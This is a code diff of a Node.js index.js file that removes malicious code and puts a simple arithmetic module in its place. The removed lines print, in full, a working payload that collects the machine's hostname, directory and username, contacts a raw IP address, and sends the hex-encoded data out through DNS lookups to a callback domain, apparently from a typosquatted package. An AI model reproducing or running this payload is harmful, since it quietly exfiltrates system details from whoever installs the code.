@@ -1,13 +1,8 @@
-const { exec } = require("child_process");
-exec("a=$(hostname;pwd;whoami;echo 'uikit-daark-mode';curl -i -k https://211.205.15.43;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done" , (error, data, getter) => {
-	if(error){
-		console.log("error",error.message);
-		return;
-	}
-	if(getter){
-		console.log(data);
-		return;
-	}
-	console.log(data);
-	
-});
+// index.js
+module.exports.add = (a, b) => a + b;
+module.exports.subtract = (a, b) => a - b;
+module.exports.multiply = (a, b) => a * b;
+module.exports.divide = (a, b) => {
+  if (b === 0) throw new Error("Cannot divide by zero");
+  return a / b;
+};
